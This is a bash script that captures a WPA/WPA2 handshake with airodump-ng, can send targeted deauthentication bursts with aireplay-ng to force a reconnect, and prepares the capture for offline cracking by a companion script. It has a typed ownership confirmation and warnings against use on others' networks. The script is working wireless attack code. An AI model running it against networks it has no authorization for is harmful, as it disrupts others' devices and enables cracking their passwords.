#!/usr/bin/env bash
#
# capture_handshake.sh — capture the WPA/WPA2 4-way handshake for YOUR OWN
# access point, so you can later verify/recover its passphrase offline.
#
# HOW WPA2-PSK AUTH WORKS (why this captures anything useful):
#   When a client joins a WPA2 network it performs a 4-way handshake with the
#   AP. Those 4 EAPOL frames contain enough material (the ANonce/SNonce and a
#   MIC computed from the Pairwise Master Key) to *verify a guessed passphrase
#   offline* — but NOT the passphrase itself. So capturing a handshake lets you
#   test candidate passwords later; it does not reveal the password directly.
#
#   To capture a handshake you need a client to (re)join while you're listening.
#   You can wait for a device to reconnect naturally, or send a targeted
#   deauth to one of YOUR OWN devices to make it reconnect immediately.
#
#   sudo bash wifi/capture_handshake.sh \
#        --iface wlan1mon --bssid AA:BB:CC:DD:EE:FF --channel 6 \
#        [--client 11:22:33:44:55:66] [--deauth 3] [--out captures/mynet]
#
# Required: --iface (monitor), --bssid (YOUR AP), --channel (YOUR AP's).
set -euo pipefail

if [[ $EUID -ne 0 ]]; then echo "Run as root." >&2; exit 1; fi

IFACE="" BSSID="" CHANNEL="" CLIENT="" DEAUTH=0 OUT="captures/handshake"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --iface)   IFACE="$2"; shift 2;;
    --bssid)   BSSID="$2"; shift 2;;
    --channel) CHANNEL="$2"; shift 2;;
    --client)  CLIENT="$2"; shift 2;;
    --deauth)  DEAUTH="$2"; shift 2;;
    --out)     OUT="$2"; shift 2;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    *) echo "Unknown option: $1" >&2; exit 1;;
  esac
done

if [[ -z "$IFACE" || -z "$BSSID" || -z "$CHANNEL" ]]; then
  echo "Missing required args. See: sudo bash $0 --help" >&2
  exit 1
fi

# --- Ownership gate -----------------------------------------------------------
cat <<EOF

  You are about to capture the WPA handshake for:
      AP BSSID : $BSSID
      Channel  : $CHANNEL
$( [[ -n "$CLIENT" ]] && echo "      Client   : $CLIENT" )
$( [[ "$DEAUTH" != 0 ]] && echo "      Deauth   : $DEAUTH burst(s) to force a reconnect" )

  Do this ONLY on a network you own or are explicitly authorized to test.
  Deauthenticating devices you do not own is illegal.

EOF
read -r -p "  Type YES if this access point is yours: " CONFIRM
[[ "$CONFIRM" == "YES" ]] || { echo "Aborted."; exit 1; }

mkdir -p "$(dirname "$OUT")"

# --- Start the capture (background) ------------------------------------------
echo "[*] Locking $IFACE to channel $CHANNEL and capturing to ${OUT}-01.cap"
airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$OUT" \
            --output-format pcap "$IFACE" &
AIRO_PID=$!
# give airodump a moment to hop to the channel and start writing
sleep 5

# --- Optional targeted deauth to speed up handshake capture -------------------
if [[ "$DEAUTH" != 0 ]]; then
  if [[ -n "$CLIENT" ]]; then
    echo "[*] Sending $DEAUTH deauth burst(s) to client $CLIENT on $BSSID (your device)…"
    aireplay-ng --deauth "$DEAUTH" -a "$BSSID" -c "$CLIENT" "$IFACE" || true
  else
    echo "[!] No --client given; skipping deauth. Prefer targeting a specific"
    echo "    device you own with --client rather than a broadcast deauth."
  fi
fi

cat <<EOF

[*] Capturing. Watch the airodump header — when a client (re)connects you'll
    see:  "WPA handshake: $BSSID"  in the top-right.
[*] Once you see that, press Ctrl-C here to stop.
EOF

# Wait for the user to Ctrl-C; then clean up airodump.
trap 'kill $AIRO_PID 2>/dev/null || true' INT TERM
wait $AIRO_PID 2>/dev/null || true

echo
echo "[*] Verifying the capture actually contains a handshake…"
if aircrack-ng "${OUT}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
  echo "[OK] Handshake present in ${OUT}-01.cap"
  echo "     Next: sudo bash wifi/crack_handshake.sh --cap ${OUT}-01.cap --bssid $BSSID"
else
  echo "[!] No handshake captured yet. Re-run and wait for (or trigger) a reconnect."
fi
